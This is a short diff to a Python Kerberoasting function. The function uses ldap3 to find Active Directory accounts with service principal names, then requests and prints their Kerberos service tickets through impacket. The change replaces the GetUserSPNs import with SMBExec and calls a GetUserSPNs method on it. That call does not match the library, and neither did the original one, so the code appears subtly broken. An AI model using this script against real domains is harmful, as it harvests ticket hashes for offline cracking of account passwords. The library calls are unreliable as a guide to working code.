@@ -1,4 +1,4 @@
-from impacket.examples import GetUserSPNs
+from impacket.smbexec import SMBExec
 from ldap3 import Server, Connection, SUBTREE
 
 def find_and_kerberoast_objects(username, password, domain, dc_ip):
@@ -18,7 +18,8 @@ def find_and_kerberoast_objects(username, password, domain, dc_ip):
             sAMAccountName = entry['sAMAccountName'].value
             servicePrincipalNames = entry['servicePrincipalName'].values
             print(f"Kerberoasting {sAMAccountName}...")
-            tgs_tickets = GetUserSPNs.getTGTForUser(username, password, domain, sAMAccountName, dc_ip)
+            smbexec = SMBExec(dc_ip, domain=domain, username=username, password=password)
+            tgs_tickets = smbexec.GetUserSPNs(sAMAccountName)
             if tgs_tickets:
                 for tgs in tgs_tickets:
                     print(tgs)
